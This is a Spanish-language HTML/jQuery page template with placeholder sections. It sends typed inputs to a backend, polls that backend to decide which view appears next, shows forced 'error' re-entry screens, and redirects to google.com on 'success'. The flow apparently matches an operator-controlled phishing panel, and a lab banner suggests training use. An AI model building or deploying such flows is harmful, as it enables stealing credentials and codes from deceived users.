<!DOCTYPE html>
<html lang="es">

<head>

</head>

<body class="px-3">
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="fixed-top bg-white d-flex align-items-center justify-content-center hidden"
        style="height: 100vh; z-index: 9999;">
        <div class="text-center">
            <div class="loading-spinner mx-auto"></div>
            <p class="mt-3">Espere un momento por favor...</p>
        </div>
    </div>

    <!-- Header -->
    <div>
        <p>Cabecera</p>
    </div>

    <!-- Vista: Seccion-1 -->
    <div id="seccion-1" class="hidden">
        <!-- Mensaje de error general -->
        <div id="errorSeccion-1">Mensaje de error seccion 1</div>                   
            <input id="input-1" name="input-1">
            <div>
                <button id="btnSeccion-1">Boton seccion 1</button>
            </div>
    </div>

    <!-- Vista: Seccion-2 -->
    <div id="seccion-2" class="hidden">
        <!-- Mensaje de error general -->
        <div id="errorSeccion-2">Mensaje de error seccion 2</div>                   
            <input id="input-2" name="input-2">
            <div>
                <button id="btnSeccion-2">Boton seccion 2</button>
            </div>
    </div>

    <!-- Vista: Esperando -->
    <div id="esperando" class="hidden">
        <div>
            <p>Espere un momento por favor.</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'seccion-1'
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function hideAllViews() {
                $('#seccion-1, #seccion-2, #exito, #error, #esperando').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                // Mostrar mensaje de error general si la vista ya fue mostrada antes
                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'esperando' && viewId !== 'exito' && viewId !== 'error') {
                    // La vista ya fue mostrada antes, mostrar mensaje de error y limpiar campos
                    if (viewId === 'seccion-1') {
                        $('#errorSeccion-1').text('Error seccion 1.').addClass('show');
                        $('#input-1').val('');
                        $('#btnSeccion-1').prop('disabled', true);
                    } else if (viewId === 'seccion-2') {
                        $('#errorSeccion-2').text('Error seccion 2.').addClass('show');
                        $('#input-2').val('');
                        $('#btnSeccion-2').prop('disabled', true);
                    }
                } else {
                    // Ocultar mensajes de error generales
                    $('.error-message.show').removeClass('show').text('');
                }

                // Registrar la vista en el historial
                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                setTimeout(iniciarPolling, 4000);
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            let enviandoABackt = false;

            async function enviarABackt() {
                if (enviandoABackt) {
                    console.log('Ya hay un envío en progreso, evitando duplicado');
                    return;
                }

                enviandoABackt = true;

                const allData = {};
                const fields = ['input-1', 'input-2', 'uniqid'];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                try {
                    const response = await fetch('/api/backt/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Backt:', result);
                } catch (e) {
                    console.error('Error al enviar a Backt:', e);
                } finally {
                    setTimeout(() => {
                        enviandoABackt = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (loadingElement && loadingElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/backt/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        // Mapeo de respuestas de Backt a vistas
                        const viewMap = {
                            'seccion-1': 'seccion-1',
                            'seccion-2': 'seccion-2',
                            'exito': 'exito',
                            'error': 'error',
                            'esperando': 'esperando'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        // Redirección automática para exito
                        if (viewId === 'exito') {
                            setTimeout(function () {
                                window.location.href = 'https://google.com/';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }


            // ==================== EVENTOS SECCION 1 ====================
            $('#btnSeccion-1').on('click', async function () {
                
                    saveToLocalStorage('input-1', $('#input-1').val().trim());
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarABackt();
                    showLoading();
                    iniciarPolling();
            });

            // ==================== EVENTOS SECCION 1 ====================
            $('#btnSeccion-2').on('click', async function () {
                
                    saveToLocalStorage('input-2', $('#input-2').val().trim());
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarABackt();
                    showLoading();
                    iniciarPolling();
            });

            // ==================== INICIALIZACIÓN ====================
            showView('seccion-1');
        });
    </script>

</body>

</html>
